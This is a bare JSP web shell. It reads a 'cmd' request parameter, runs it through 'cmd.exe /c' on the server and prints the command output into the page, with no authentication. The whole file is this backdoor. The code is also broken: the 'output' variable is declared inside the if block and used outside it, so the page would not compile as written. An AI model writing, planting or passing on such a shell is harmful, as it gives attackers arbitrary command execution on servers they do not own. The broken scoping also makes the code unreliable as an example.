<%@ page import="java.io.*" %>

<%
if (request.getParameter("cmd") != null){
	Process ps = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
	BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
	String s = null;
	String output = "";
	while ((s = br.readLine()) != null) {
		output += s;
	}
}
%>
<%=output%>
